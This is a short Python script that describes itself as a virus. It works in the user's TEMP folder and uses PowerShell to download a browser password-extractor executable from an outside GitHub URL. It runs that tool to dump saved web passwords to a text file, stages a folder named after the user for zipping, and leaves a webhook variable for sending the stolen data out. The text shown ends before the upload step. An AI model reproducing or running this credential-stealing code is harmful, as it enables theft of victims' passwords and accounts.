import os
os.chdir(os.getenv('TEMP'))


#Your webhook adress
webhook = ""

# link to web password extractor.
link1 = "https://raw.githubusercontent.com/yusufemrekaraca/K4RCA/main/browserpassword.exe"

# Checking for abusive usings.

if os.path.isfile("k4rca.k4rca")== True:
    print("app is already working.")
    exit()
else:
    os.system("echo :) >> k4rca.k4rca")

# Creates the needed enviroment for the virus
os.system("mkdir k4rca")
os.chdir("k4rca")

# Downloads the app needed for credential extraction
os.system("Powershell -command Invoke-WebRequest -OutFile main.exe -Uri {}".format(link1))
os.system("main.exe /stext webpasswords.txt")

#creating a temporary folder so we can keep the information to make a zip file later on
os.system("mdkir {}".format(os.getenv("USERNAME")))





    
